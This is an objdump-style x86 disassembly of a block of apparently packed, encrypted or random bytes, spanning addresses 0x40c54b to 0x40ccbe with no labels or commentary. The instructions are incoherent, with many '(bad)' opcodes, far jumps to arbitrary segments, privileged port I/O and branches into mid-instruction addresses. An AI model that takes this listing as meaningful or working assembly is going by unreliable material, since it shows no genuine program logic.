  40c54b:	call   0xa31:0x37f5a1e4
  40c552:	ffree  st(2)
  40c554:	sar    al,1
  40c556:	push   ebp
  40c557:	mov    ds:0xae34fcd,eax
  40c55c:	ins    BYTE PTR es:[edi],dx
  40c55d:	inc    ebx
  40c55e:	or     al,0xf4
  40c560:	mov    esp,0xc3bbd513
  40c565:	neg    DWORD PTR [esi+0x44]
  40c568:	adc    dl,cl
  40c56a:	cdq    
  40c56b:	fsubr  DWORD PTR [ecx-0x7a877ed4]
  40c571:	sub    esi,ecx
  40c573:	cmp    ch,bh
  40c575:	int3   
  40c576:	add    al,0x9
  40c578:	mov    bh,0x32
  40c57a:	jb     0x40c535
  40c57c:	dec    ecx
  40c57d:	jecxz  0x40c5d2
  40c57f:	or     al,0xda
  40c581:	mov    BYTE PTR [edx-0x5d],dl
  40c584:	adc    DWORD PTR [edx+eiz*2-0x1c],0x69
  40c589:	je     0x40c5e7
  40c58b:	push   eax
  40c58c:	stos   BYTE PTR es:[edi],al
  40c58d:	mov    DWORD PTR [edx+0x6e],ebp
  40c590:	xchg   BYTE PTR [eax+edx*2+0x1e12f1b3],al
  40c597:	(bad)  
  40c598:	adc    dh,BYTE PTR [eax+0x30f89567]
  40c59e:	outs   dx,DWORD PTR ds:[esi]
  40c59f:	jae    0x40c5ee
  40c5a1:	test   DWORD PTR [edx-0x6f],ecx
  40c5a4:	push   cs
  40c5a5:	mov    ds:0xafda896f,eax
  40c5aa:	push   ecx
  40c5ab:	icebp  
  40c5ac:	ins    DWORD PTR es:[edi],dx
  40c5ad:	shl    BYTE PTR [ebp+0x7a],1
  40c5b0:	xor    al,0x7a
  40c5b2:	sub    al,0xbb
  40c5b4:	lods   al,BYTE PTR ds:[esi]
  40c5b5:	call   0x2dc5cbca
  40c5ba:	les    esp,FWORD PTR [esi-0x1dfeb288]
  40c5c0:	aam    0x5e
  40c5c2:	repnz cmp ebx,DWORD PTR [eax]
  40c5c5:	cwde   
  40c5c6:	call   DWORD PTR [ebx]
  40c5c8:	(bad)  
  40c5c9:	stos   DWORD PTR es:[edi],eax
  40c5ca:	pop    ss
  40c5cb:	lods   eax,DWORD PTR ds:[esi]
  40c5cc:	xchg   esp,eax
  40c5cd:	push   ss
  40c5ce:	out    0xec,al
  40c5d0:	sti    
  40c5d1:	call   FWORD PTR [edi]
  40c5d3:	sub    BYTE PTR ds:0xa41ba009,ch
  40c5d9:	xor    ebx,eax
  40c5db:	addr16 jbe 0x40c5dd
  40c5de:	mov    esi,0xd1a20c7b
  40c5e3:	add    al,0xf8
  40c5e5:	mov    dh,0x46
  40c5e7:	cmp    eax,0x57422262
  40c5ec:	es retf 
  40c5ee:	ins    DWORD PTR es:[edi],dx
  40c5ef:	scas   al,BYTE PTR es:[edi]
  40c5f0:	les    ecx,FWORD PTR [ebx]
  40c5f2:	ret    
  40c5f3:	jnp    0x40c580
  40c5f5:	push   es
  40c5f6:	inc    esp
  40c5f7:	add    edx,DWORD PTR [ebx]
  40c5f9:	xchg   esi,eax
  40c5fa:	(bad)  
  40c5fb:	push   esp
  40c5fc:	jmp    0x4d61:0x681c8f5e
  40c603:	mov    dh,0x31
  40c605:	enter  0x110f,0x9
  40c609:	mov    al,ds:0x227a4de1
  40c60e:	or     bl,BYTE PTR [edi]
  40c610:	sub    eax,0x7e29375a
  40c615:	xor    al,0x7b
  40c617:	sbb    al,0x71
  40c619:	push   cs
  40c61a:	jp     0x40c60b
  40c61c:	ss inc edx
  40c61e:	sub    al,0xce
  40c620:	inc    edx
  40c621:	(bad)  
  40c622:	call   0x98688c73
  40c627:	test   al,0xcd
  40c629:	repnz add bh,0x4a
  40c62d:	ficom  DWORD PTR [ebp-0x69]
  40c630:	add    eax,ecx
  40c632:	in     eax,0xe8
  40c634:	out    dx,eax
  40c635:	dec    esi
  40c636:	sbb    ebp,DWORD PTR [edi]
  40c638:	fs push esi
  40c63a:	sub    al,BYTE PTR [edx]
  40c63c:	imul   ecx,esp,0x12
  40c63f:	mov    esp,0x5fd67207
  40c644:	mov    ebp,0x6af4d7de
  40c649:	lods   eax,DWORD PTR ds:[esi]
  40c64a:	mov    al,ds:0xd453c6d0
  40c64f:	mov    al,0xbf
  40c651:	test   BYTE PTR [edi+esi*8+0x0],dh
  40c655:	loopne 0x40c64b
  40c657:	test   WORD PTR [edi+0x5695b12],di
  40c65e:	mov    ebx,0x39ddf086
  40c663:	push   ebp
  40c664:	xchg   esp,eax
  40c665:	aam    0x4a
  40c667:	cmp    al,BYTE PTR [ebp+0x3a]
  40c66a:	fild   WORD PTR [ebx-0x11]
  40c66d:	out    dx,eax
  40c66e:	icebp  
  40c66f:	and    eax,0xcf2fb5cf
  40c674:	inc    ebx
  40c675:	pop    ss
  40c676:	mov    ds:0x2bfd8aa6,al
  40c67b:	mov    edi,0x9c228bcb
  40c680:	xor    DWORD PTR [edi+edx*1],edi
  40c683:	repz mov eax,0xd2c84fee
  40c689:	mov    esp,0x6845f2cf
  40c68e:	push   cs
  40c68f:	bound  esi,QWORD PTR ds:0x38466db8
  40c695:	(bad)  
  40c696:	sahf   
  40c697:	jle    0x40c66e
  40c699:	pop    esp
  40c69a:	sub    eax,0xb3e046a3
  40c69f:	sub    BYTE PTR [ebx+0x448aacd2],cl
  40c6a5:	inc    ebx
  40c6a6:	mov    BYTE PTR [edi-0x33014e10],dl
  40c6ac:	pop    esp
  40c6ad:	daa    
  40c6ae:	jne    0x40c69a
  40c6b0:	xor    DWORD PTR [edi-0x294229a],ebp
  40c6b6:	adc    ch,ch
  40c6b8:	add    al,0xc3
  40c6ba:	out    dx,eax
  40c6bb:	cmp    DWORD PTR [ebp-0x643c2599],ebx
  40c6c1:	aas    
  40c6c2:	jnp    0x40c64a
  40c6c4:	xchg   edx,eax
  40c6c5:	lahf   
  40c6c6:	and    eax,0xf93bb1b2
  40c6cb:	loope  0x40c6af
  40c6cd:	mov    ecx,0x167f66be
  40c6d2:	jle    0x40c66d
  40c6d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6d5:	xlat   BYTE PTR ds:[ebx]
  40c6d6:	push   esi
  40c6d7:	pusha  
  40c6d8:	and    eax,DWORD PTR [ecx-0x9e84099]
  40c6de:	pop    edx
  40c6df:	or     DWORD PTR [ebx-0x6c5a986c],ecx
  40c6e5:	jmp    0x2c88960a
  40c6ea:	dec    ebp
  40c6eb:	test   BYTE PTR [ebx+0x67],cl
  40c6ee:	pop    ebx
  40c6ef:	ins    DWORD PTR es:[edi],dx
  40c6f0:	ficom  DWORD PTR [esi]
  40c6f2:	cmp    BYTE PTR [ebx-0x39c480d],dl
  40c6f8:	arpl   WORD PTR [eax-0x8d3c394],bx
  40c6fe:	jno    0x40c6e5
  40c700:	mov    esi,DWORD PTR [ebx]
  40c702:	inc    eax
  40c703:	push   ebx
  40c704:	xor    eax,0xe9a1d1b0
  40c709:	fcmovnbe st,st(2)
  40c70b:	cmp    BYTE PTR [eax],al
  40c70d:	push   esp
  40c70e:	in     ax,dx
  40c710:	loope  0x40c706
  40c712:	cs nop
  40c714:	jno    0x40c6d6
  40c716:	fdecstp 
  40c718:	jl     0x40c74f
  40c71a:	dec    esi
  40c71b:	mov    ch,0xd9
  40c71d:	test   eax,0x2959c0fc
  40c722:	add    al,0xf7
  40c724:	xchg   esi,eax
  40c725:	or     BYTE PTR [edx+0x61deffa0],bl
  40c72b:	scas   al,BYTE PTR es:[edi]
  40c72c:	mov    ds:0xecd6cd7a,al
  40c731:	jecxz  0x40c6c1
  40c733:	mul    BYTE PTR [edx]
  40c735:	stc    
  40c736:	xor    al,BYTE PTR [esi+edi*1-0x38d0f65e]
  40c73d:	in     eax,dx
  40c73e:	mov    esi,0x7b8e71d9
  40c743:	out    0xe,al
  40c745:	cli    
  40c746:	jnp    0x40c6de
  40c748:	inc    ebp
  40c749:	(bad)  
  40c74a:	push   ss
  40c74b:	and    al,0x1b
  40c74d:	jp     0x40c6d5
  40c74f:	stos   DWORD PTR es:[edi],eax
  40c750:	xor    eax,0xca01b1a5
  40c755:	leave  
  40c756:	ins    DWORD PTR es:[edi],dx
  40c757:	(bad)  
  40c759:	shl    BYTE PTR [eax-0x6d],0x4e
  40c75d:	mov    cl,0xca
  40c75f:	pop    ecx
  40c760:	jge    0x40c7be
  40c762:	loope  0x40c760
  40c764:	sbb    ch,BYTE PTR [ebx]
  40c766:	sti    
  40c767:	sti    
  40c768:	add    eax,0xe1d98f24
  40c76d:	xchg   esp,eax
  40c76e:	fwait
  40c76f:	jmp    0x141f:0xd39a95d2
  40c776:	in     eax,dx
  40c777:	pop    esp
  40c778:	ins    DWORD PTR es:[edi],dx
  40c779:	mov    dl,0x87
  40c77b:	out    0xbf,al
  40c77d:	mov    WORD PTR [ebx],ss
  40c77f:	push   eax
  40c780:	add    ebp,ecx
  40c782:	gs jbe 0x40c78c
  40c785:	jns    0x40c7c1
  40c787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c788:	in     eax,0x52
  40c78a:	mov    esi,0xa068985e
  40c78f:	pop    eax
  40c790:	idiv   DWORD PTR [ecx+0x556a96e9]
  40c796:	inc    edx
  40c797:	pop    ecx
  40c798:	jbe    0x40c7d1
  40c79a:	je     0x40c7b9
  40c79c:	pusha  
  40c79d:	inc    ebx
  40c79e:	jmp    0x5e89c67a
  40c7a3:	mov    ?,WORD PTR [edx+edx*2-0x17]
  40c7a7:	mov    ah,0xe7
  40c7a9:	es cmp ch,ch
  40c7ac:	jmp    0x40c775
  40c7ae:	mov    bh,0x14
  40c7b0:	ins    DWORD PTR es:[edi],dx
  40c7b1:	sub    edi,DWORD PTR [ecx-0x2c]
  40c7b4:	int    0x84
  40c7b6:	(bad)  
  40c7b7:	or     ebp,DWORD PTR [ebp+0x6a]
  40c7ba:	sbb    eax,0x4e762167
  40c7bf:	pusha  
  40c7c0:	mov    ds:0x347afe8c,al
  40c7c5:	mov    edi,0x2f3a16ca
  40c7ca:	pushf  
  40c7cb:	adc    DWORD PTR [edx-0x11513495],esp
  40c7d1:	dec    edi
  40c7d2:	popa   
  40c7d3:	push   ss
  40c7d4:	xchg   BYTE PTR [edi],dl
  40c7d6:	stc    
  40c7d7:	inc    edi
  40c7d8:	add    BYTE PTR [ecx-0x52],al
  40c7db:	jnp    0x40c783
  40c7dd:	cwde   
  40c7de:	sbb    al,0x6c
  40c7e0:	shl    DWORD PTR [edx],cl
  40c7e2:	clc    
  40c7e3:	lods   eax,DWORD PTR ds:[esi]
  40c7e4:	int    0x11
  40c7e6:	mov    esi,0xf3abcc28
  40c7eb:	inc    ebp
  40c7ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7ed:	out    0x9e,al
  40c7ef:	xchg   edx,eax
  40c7f0:	pusha  
  40c7f1:	dec    ebx
  40c7f2:	hlt    
  40c7f3:	mov    bl,0xf3
  40c7f5:	mov    ebp,DWORD PTR [esi]
  40c7f7:	jl     0x40c84a
  40c7f9:	push   esi
  40c7fa:	mov    edi,ecx
  40c7fc:	bound  ebp,QWORD PTR [eax+0x76]
  40c7ff:	out    dx,eax
  40c800:	xchg   ebp,eax
  40c801:	pop    ebp
  40c802:	and    esi,ecx
  40c804:	test   DWORD PTR [edi-0x49],0x2b1e0d5d
  40c80b:	loop   0x40c7c5
  40c80d:	jp     0x40c79d
  40c80f:	xchg   edx,eax
  40c810:	pop    esp
  40c811:	cwde   
  40c812:	mov    ebp,0xea98dff1
  40c817:	push   0x4c
  40c819:	in     eax,dx
  40c81a:	dec    edx
  40c81b:	xor    BYTE PTR [edi],bl
  40c81d:	sbb    DWORD PTR [eax-0x43],esp
  40c820:	hlt    
  40c821:	jmp    0x44db:0x5167cb67
  40c828:	mov    ebp,0x997e811c
  40c82d:	adc    ebp,ebx
  40c82f:	ins    BYTE PTR es:[edi],dx
  40c830:	pop    ecx
  40c831:	add    eax,0xdb8ff073
  40c836:	push   ss
  40c837:	lahf   
  40c838:	(bad)  
  40c839:	outs   dx,BYTE PTR ds:[esi]
  40c83a:	ins    BYTE PTR es:[edi],dx
  40c83b:	add    eax,ebp
  40c83d:	push   ecx
  40c83e:	out    0x1d,eax
  40c840:	jnp    0x40c805
  40c842:	sub    eax,0xb63e0eaa
  40c847:	pop    ebx
  40c848:	mov    ebp,ecx
  40c84a:	dec    eax
  40c84b:	mov    ebx,0x91c9e6f3
  40c850:	sub    DWORD PTR [ebp-0x68a70971],edi
  40c856:	xor    al,0x43
  40c858:	call   0x20fb9640
  40c85d:	aad    0xc6
  40c85f:	xchg   DWORD PTR [ebx+0x20be7288],ebx
  40c865:	in     eax,0x65
  40c867:	pop    ss
  40c868:	xor    al,0x77
  40c86a:	mov    ah,0xa0
  40c86c:	enter  0xc27a,0xa6
  40c870:	sub    eax,0x807f37f2
  40c875:	cwde   
  40c876:	sub    eax,DWORD PTR [edi-0x526b1154]
  40c87c:	es out dx,eax
  40c87e:	mov    bl,0xb5
  40c880:	sbb    eax,0x3857fb42
  40c885:	cmp    ch,dh
  40c887:	xchg   DWORD PTR [ecx-0x5a],ecx
  40c88a:	mov    edi,0x89cea
  40c88f:	loop   0x40c866
  40c891:	push   esi
  40c892:	das    
  40c893:	xchg   ebp,eax
  40c894:	inc    esi
  40c895:	add    cl,ah
  40c897:	repnz cmp BYTE PTR [ebx],cl
  40c89a:	jbe    0x40c89b
  40c89c:	push   ecx
  40c89d:	inc    ebx
  40c89e:	mov    eax,0xb652f52
  40c8a3:	test   al,0x9e
  40c8a5:	push   eax
  40c8a6:	cwde   
  40c8a7:	or     eax,0x2300d6e8
  40c8ac:	lds    edx,FWORD PTR [esi+0x78]
  40c8af:	mov    WORD PTR [bx+di],fs
  40c8b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8b3:	pop    esi
  40c8b4:	jge    0x40c905
  40c8b6:	push   0xffffffc2
  40c8b8:	fadd   st,st(6)
  40c8ba:	ror    ebp,cl
  40c8bc:	cmp    al,0xd3
  40c8be:	inc    esp
  40c8bf:	mov    esi,0x91eea48
  40c8c4:	cmp    al,0xe0
  40c8c6:	pop    edi
  40c8c7:	xor    DWORD PTR [ebx+ecx*1],0xffffff83
  40c8cb:	cmp    ebp,ebp
  40c8cd:	xor    DWORD PTR [edi],ecx
  40c8cf:	fnsave [esp+ebp*8]
  40c8d2:	xchg   edi,eax
  40c8d3:	ret    
  40c8d4:	bnd jle 0x40c8bd
  40c8d7:	push   ss
  40c8d8:	or     dl,BYTE PTR [ecx]
  40c8da:	or     eax,0xa3555864
  40c8df:	imul   ebx,DWORD PTR [ecx+0x2f48c89e],0x16
  40c8e6:	xchg   esp,eax
  40c8e7:	js     0x40c88f
  40c8e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8ea:	and    eax,0xd52dd9c3
  40c8ef:	cwde   
  40c8f0:	cmp    DWORD PTR [ebx],ebx
  40c8f2:	push   edi
  40c8f3:	cmp    eax,0x979f8c96
  40c8f8:	inc    esp
  40c8f9:	rcr    BYTE PTR [edx],cl
  40c8fb:	js     0x40c913
  40c8fd:	adc    eax,DWORD PTR [edi-0x3c]
  40c900:	adc    al,0xc4
  40c902:	pop    edi
  40c903:	repnz pop esp
  40c905:	and    dl,BYTE PTR [edi-0x1aa4b98b]
  40c90b:	add    ah,BYTE PTR [ecx]
  40c90d:	pop    esi
  40c90e:	cwde   
  40c90f:	add    ebx,DWORD PTR [ecx]
  40c911:	mov    ebp,0x57763e9d
  40c916:	lahf   
  40c917:	or     dl,BYTE PTR [edi-0x370b9f4]
  40c91d:	lahf   
  40c91e:	inc    ebx
  40c91f:	ds loop 0x40c8fe
  40c922:	mov    bl,0x7a
  40c924:	push   cs
  40c925:	cmp    ch,0xbe
  40c928:	pop    ebp
  40c929:	mov    eax,ds:0x2bc8f012
  40c92e:	shl    BYTE PTR [eax+0x65893c16],1
  40c934:	out    dx,al
  40c935:	imul   eax
  40c937:	test   bh,ah
  40c939:	out    0x38,al
  40c93b:	xchg   ebx,eax
  40c93c:	fisubr WORD PTR [edx-0x79]
  40c93f:	popf   
  40c940:	lahf   
  40c941:	inc    esp
  40c942:	shl    BYTE PTR [ebp+ecx*4+0x5718fc74],cl
  40c949:	nop
  40c94a:	xor    eax,DWORD PTR [esi]
  40c94c:	int    0x63
  40c94e:	mov    eax,0xbdd678bb
  40c953:	cwde   
  40c954:	jl     0x40c92a
  40c956:	cmp    ebx,ecx
  40c958:	or     cl,dh
  40c95a:	rcr    DWORD PTR [ecx+0x1b7fc736],1
  40c960:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c961:	test   DWORD PTR [esi+0x66cfe2b2],ebp
  40c967:	(bad)  
  40c968:	or     bh,ah
  40c96a:	jl     0x40c9c8
  40c96c:	jp     0x40c98e
  40c96e:	inc    edi
  40c96f:	ficom  WORD PTR [eax-0xddae736]
  40c975:	xchg   DWORD PTR [ecx+0x23ce7afe],edi
  40c97b:	pop    edi
  40c97c:	push   esi
  40c97d:	mov    esp,0xffc0ab4c
  40c982:	aam    0x7
  40c984:	fdivr  st(6),st
  40c986:	push   ebp
  40c987:	je     0x40c9ce
  40c989:	shl    ah,cl
  40c98b:	xlat   BYTE PTR ds:[ebx]
  40c98c:	aas    
  40c98d:	mov    ah,0xe
  40c98f:	jecxz  0x40c964
  40c991:	and    BYTE PTR [edx+0x2e],0x29
  40c995:	mov    esi,0x48111ef2
  40c99a:	in     eax,dx
  40c99b:	push   esi
  40c99c:	jmp    0x40c9c0
  40c99e:	sub    ebp,eax
  40c9a0:	sbb    al,0xc0
  40c9a2:	dec    eax
  40c9a3:	stos   BYTE PTR es:[edi],al
  40c9a4:	push   edi
  40c9a5:	aaa    
  40c9a6:	push   esi
  40c9a7:	repz sbb BYTE PTR [eax+0x6b],ah
  40c9ab:	std    
  40c9ac:	xchg   ecx,eax
  40c9ad:	jmp    0xa3eb0424
  40c9b2:	gs mov al,0x8c
  40c9b5:	jle    0x40c998
  40c9b7:	xchg   edx,eax
  40c9b8:	jl     0x40ca20
  40c9ba:	pop    sp
  40c9bc:	lods   al,BYTE PTR ds:[esi]
  40c9bd:	sub    eax,0x866885be
  40c9c2:	dec    edx
  40c9c3:	into   
  40c9c4:	cwde   
  40c9c5:	mov    dl,0x94
  40c9c7:	mov    dl,0x1f
  40c9c9:	xchg   ebp,eax
  40c9ca:	xor    BYTE PTR [esi+0x4],bl
  40c9cd:	hlt    
  40c9ce:	push   ds
  40c9cf:	fldcw  WORD PTR [ecx-0x1e]
  40c9d2:	xor    eax,0xc3f91c8f
  40c9d7:	sub    edx,0x5a
  40c9da:	ret    
  40c9db:	xchg   edi,eax
  40c9dc:	add    BYTE PTR [ebp-0x4fff1446],bh
  40c9e2:	or     DWORD PTR [esi+0x79aa4f97],esi
  40c9e8:	xchg   ecx,eax
  40c9e9:	pop    esp
  40c9ea:	pop    es
  40c9eb:	std    
  40c9ec:	ja     0x40c98f
  40c9ee:	mov    ch,0x19
  40c9f0:	adc    bh,ch
  40c9f2:	mov    ds:0x171ba8c,al
  40c9f7:	xor    bl,bl
  40c9f9:	hlt    
  40c9fa:	fldenv [ecx+0x1f]
  40c9fd:	xchg   DWORD PTR [edx-0xa],ecx
  40ca00:	mov    ds:0x3d18201e,al
  40ca05:	pushf  
  40ca06:	pop    esp
  40ca07:	push   edx
  40ca08:	imul   esp,DWORD PTR [esi-0x43fd6c2f],0x78
  40ca0f:	push   ebx
  40ca10:	pop    ecx
  40ca11:	adc    eax,0x57db3a75
  40ca16:	int3   
  40ca17:	mov    eax,0x5b537817
  40ca1c:	push   es
  40ca1d:	imul   ecx,DWORD PTR ds:0x95956255,0xacce6d58
  40ca27:	in     al,0xcd
  40ca29:	fild   WORD PTR [eax+0x57]
  40ca2c:	jecxz  0x40c9d4
  40ca2e:	push   ebp
  40ca2f:	or     edi,ebx
  40ca31:	addps  xmm4,XMMWORD PTR [ecx]
  40ca34:	icebp  
  40ca35:	pop    edx
  40ca36:	adc    ebp,DWORD PTR ds:0xefd7f2f2
  40ca3c:	mov    ds:0xed0dce3a,eax
  40ca41:	lock pusha 
  40ca43:	call   0x4e9a:0x31eb2798
  40ca4a:	lock imul eax,DWORD PTR [ebx],0xffffffd6
  40ca4e:	(bad)  
  40ca4f:	leave  
  40ca50:	pop    edx
  40ca51:	push   eax
  40ca52:	hlt    
  40ca53:	inc    ecx
  40ca54:	cmp    BYTE PTR [eax+edx*4-0x5b],cl
  40ca58:	cld    
  40ca59:	push   ebp
  40ca5a:	lock xor eax,0xe20719be
  40ca60:	fdiv   QWORD PTR [eax]
  40ca62:	arpl   WORD PTR [edx-0x1],bp
  40ca65:	jb     0x40ca76
  40ca67:	mov    DWORD PTR [esi],ebp
  40ca69:	add    DWORD PTR es:[edx+eiz*8+0x23],edx
  40ca6e:	rcl    BYTE PTR [edi-0x3c],cl
  40ca71:	clc    
  40ca72:	ss push edi
  40ca74:	lds    ebp,FWORD PTR [eax]
  40ca76:	inc    esi
  40ca77:	sbb    edx,DWORD PTR [ecx+0x6c42be5]
  40ca7d:	mov    bl,0xdf
  40ca7f:	jmp    0x7275:0xa77f524
  40ca86:	dec    esp
  40ca87:	jle    0x40caf4
  40ca89:	ss mov dl,0x8c
  40ca8c:	imul   edi,DWORD PTR [edi],0xe26d4089
  40ca92:	imul   edi,DWORD PTR [edx-0x60],0x9
  40ca96:	dec    edi
  40ca97:	mov    BYTE PTR [esi+eiz*4],ch
  40ca9a:	add    BYTE PTR [esi-0x60972fc2],dh
  40caa0:	movntq (bad),mm7
  40caa1:	out    0xfb,eax
  40caa3:	or     BYTE PTR [ecx-0x7d269257],al
  40caa9:	retf   
  40caaa:	pop    edx
  40caab:	int    0xa6
  40caad:	pop    ecx
  40caae:	mov    esi,0xaf0ad295
  40cab3:	or     bh,BYTE PTR [ebx+0x33c2ccbd]
  40cab9:	retf   
  40caba:	jge    0x40ca61
  40cabc:	push   ds
  40cabd:	add    al,0x70
  40cabf:	fstp   QWORD PTR [ebx-0x29710c2c]
  40cac5:	mov    eax,ds:0xeb64c67f
  40caca:	pop    es
  40cacb:	xchg   esp,eax
  40cacc:	mov    edx,0x41d03fa8
  40cad1:	test   DWORD PTR [edx+0x5c],0x23073956
  40cad8:	(bad)  
  40cad9:	test   BYTE PTR [ecx+ebp*4],0xf8
  40cadd:	ja     0x40cb4d
  40cadf:	(bad)
  40cae2:	pop    edi
  40cae3:	cmp    BYTE PTR [ebp+0x0],0xd3
  40cae7:	jmp    0x103009eb
  40caec:	cmc    
  40caed:	imul   ebx,DWORD PTR [edx+0x594c3e76],0x272bbee3
  40caf7:	imul   esi,DWORD PTR [edi-0x3b],0x83f0adb1
  40cafe:	ret    
  40caff:	cmp    dl,BYTE PTR [ecx]
  40cb01:	sbb    al,0xf0
  40cb03:	push   0xa68f047d
  40cb08:	cli    
  40cb09:	popa   
  40cb0a:	(bad)  
  40cb0c:	pop    ecx
  40cb0d:	in     al,0x4e
  40cb0f:	cmp    eax,ebp
  40cb11:	in     eax,0x8b
  40cb13:	jbe    0x40cb67
  40cb15:	mov    esi,0x2dfc654a
  40cb1a:	push   0x2d
  40cb1c:	mov    ch,0xb9
  40cb1e:	fs mov ah,0xb3
  40cb21:	add    al,0x13
  40cb23:	cwde   
  40cb24:	and    edi,DWORD PTR ds:0x4bab85f6
  40cb2a:	mov    ah,0xa2
  40cb2c:	(bad)  
  40cb2d:	xchg   esp,eax
  40cb2e:	or     DWORD PTR [esi+0x1112d3ca],esp
  40cb34:	cs sub al,0xb4
  40cb37:	xcrypt-ecb (bad)
  40cb38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb39:	mov    BYTE PTR [ebp+0x78],dh
  40cb3c:	cmova  sp,cx
  40cb40:	ins    BYTE PTR es:[edi],dx
  40cb41:	fsubr  DWORD PTR [ebx*2+0x4e327935]
  40cb48:	add    eax,0x83db25d1
  40cb4d:	icebp  
  40cb4e:	sbb    esp,ebp
  40cb50:	fcom   DWORD PTR [ecx]
  40cb52:	out    dx,al
  40cb53:	lods   eax,DWORD PTR ds:[esi]
  40cb54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb55:	ja     0x40cb78
  40cb57:	pop    ds
  40cb58:	jecxz  0x40cbc6
  40cb5a:	daa    
  40cb5b:	xchg   ecx,eax
  40cb5c:	jns    0x40cb67
  40cb5e:	mov    cl,0xdc
  40cb60:	jb     0x40cb6e
  40cb62:	aaa    
  40cb63:	mov    es,WORD PTR [ebx-0x18]
  40cb66:	pop    ebp
  40cb67:	cmp    eax,0x90e4b215
  40cb6c:	enter  0x5efc,0xb0
  40cb70:	addr16 out dx,eax
  40cb72:	cmp    DWORD PTR [ebp-0x5757b920],esp
  40cb78:	(bad)  [edx+ecx*1]
  40cb7b:	enter  0x1c8d,0xa7
  40cb7f:	mov    esp,0x91fa778b
  40cb84:	lds    ebx,FWORD PTR [edi]
  40cb86:	out    dx,al
  40cb87:	sub    al,0x15
  40cb89:	nop
  40cb8a:	inc    esi
  40cb8b:	mov    cl,0xaa
  40cb8d:	pusha  
  40cb8e:	dec    eax
  40cb8f:	mov    ds:0x17786c85,eax
  40cb94:	push   cs
  40cb95:	xor    eax,0x11916a3c
  40cb9a:	mov    ecx,0x703e43c1
  40cb9f:	add    bh,bl
  40cba1:	push   cs
  40cba2:	gs inc edi
  40cba4:	addr16 and ah,al
  40cba7:	jg     0x40cc19
  40cba9:	inc    DWORD PTR [esi-0x32adfe51]
  40cbaf:	or     eax,0x60795078
  40cbb4:	mov    dl,0xc
  40cbb6:	mov    ah,0xfc
  40cbb8:	stos   DWORD PTR es:[edi],eax
  40cbb9:	and    eax,0x70fe2c8a
  40cbbe:	(bad)  
  40cbbf:	popa   
  40cbc0:	jle    0x40cb75
  40cbc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbc3:	sbb    DWORD PTR [ebx+edi*4],eax
  40cbc6:	dec    DWORD PTR [edi+ecx*1-0x36baf304]
  40cbcd:	pop    esp
  40cbce:	aam    0xce
  40cbd0:	hlt    
  40cbd1:	pushf  
  40cbd2:	(bad)  
  40cbd3:	pop    esp
  40cbd4:	cmp    al,0xb6
  40cbd6:	daa    
  40cbd7:	xor    DWORD PTR [edi+0x376842b8],esp
  40cbdd:	push   0xfffffff2
  40cbdf:	arpl   bx,sp
  40cbe1:	test   cl,cl
  40cbe3:	pop    edx
  40cbe4:	add    BYTE PTR [edx],0x74
  40cbe7:	jns    0x40cbb6
  40cbe9:	in     al,0x67
  40cbeb:	mov    al,ds:0xa5862a32
  40cbf0:	test   BYTE PTR [edx-0x4135417c],al
  40cbf6:	jae    0x40cb7e
  40cbf8:	push   0x90c91c48
  40cbfd:	es pushf 
  40cbff:	and    WORD PTR [ebx-0x1a],sp
  40cc03:	fs inc edi
  40cc05:	xlat   BYTE PTR ds:[ebx]
  40cc06:	aad    0x91
  40cc08:	dec    edi
  40cc09:	pushf  
  40cc0a:	cld    
  40cc0b:	jp     0x40cbd5
  40cc0d:	push   edx
  40cc0e:	ds daa 
  40cc10:	jp     0x40cbf1
  40cc12:	in     al,0xea
  40cc14:	xchg   esp,eax
  40cc15:	pop    edx
  40cc16:	aam    0x77
  40cc18:	mov    eax,?
  40cc1a:	mov    ebp,0x2f8ff11c
  40cc1f:	xchg   bl,bl
  40cc21:	jge    0x40cbaa
  40cc23:	fadd   QWORD PTR [eax+0x7a]
  40cc26:	and    BYTE PTR [eax+0x3b23ab3b],al
  40cc2c:	jae    0x40cbdf
  40cc2e:	or     al,0xeb
  40cc30:	lahf   
  40cc31:	jg     0x40cc2f
  40cc33:	stos   BYTE PTR es:[edi],al
  40cc34:	xor    eax,0xadaea626
  40cc39:	jl     0x40cc22
  40cc3b:	ret    
  40cc3c:	or     ebp,DWORD PTR [ebx+eax*8-0x61]
  40cc40:	or     esi,edi
  40cc42:	sbb    DWORD PTR [esi+0x4c438a42],edi
  40cc48:	jmp    0x40cc4a
  40cc4a:	sbb    eax,0x6f10c4bd
  40cc4f:	arpl   WORD PTR [esi-0x5277578b],cx
  40cc55:	shl    BYTE PTR [ebp+0x3569225e],1
  40cc5b:	shl    BYTE PTR [ecx+0x91aed27],0xfe
  40cc62:	sub    ch,dl
  40cc64:	test   al,ah
  40cc66:	adc    al,0xc1
  40cc68:	pop    edi
  40cc69:	push   0x75
  40cc6b:	loop   0x40cca7
  40cc6d:	xchg   cl,cl
  40cc6f:	out    dx,al
  40cc70:	dec    edx
  40cc71:	push   eax
  40cc72:	cld    
  40cc73:	ret    
  40cc74:	into   
  40cc75:	jecxz  0x40cced
  40cc77:	sbb    BYTE PTR [eax+0x1aa24fe2],bl
  40cc7d:	or     BYTE PTR [ebx+0x34],ch
  40cc80:	(bad)  
  40cc81:	dec    eax
  40cc82:	or     DWORD PTR [ebp+0x1e],ecx
  40cc85:	cmp    eax,0x50984397
  40cc8a:	xchg   DWORD PTR [ecx-0x32d1d84d],ecx
  40cc90:	popa   
  40cc91:	or     eax,0x462e0669
  40cc96:	outs   dx,BYTE PTR ds:[esi]
  40cc97:	dec    edx
  40cc98:	or     BYTE PTR [edx-0x52],0xfe
  40cc9c:	rcl    BYTE PTR [edx+0x36],1
  40cc9f:	jle    0x40cc6e
  40cca1:	jmp    0xf89a:0xe11e31a9
  40cca8:	pop    ds
  40cca9:	stos   DWORD PTR es:[edi],eax
  40ccaa:	retf   0xc9d1
  40ccad:	jnp    0x40cd22
  40ccaf:	jo     0x40ccc4
  40ccb1:	(bad)  
  40ccb2:	je     0x40cc69
  40ccb4:	xchg   BYTE PTR [ebp+0x1e],bh
  40ccb7:	call   0x556f:0x42f01632
  40ccbe:	mov    al,0xdd
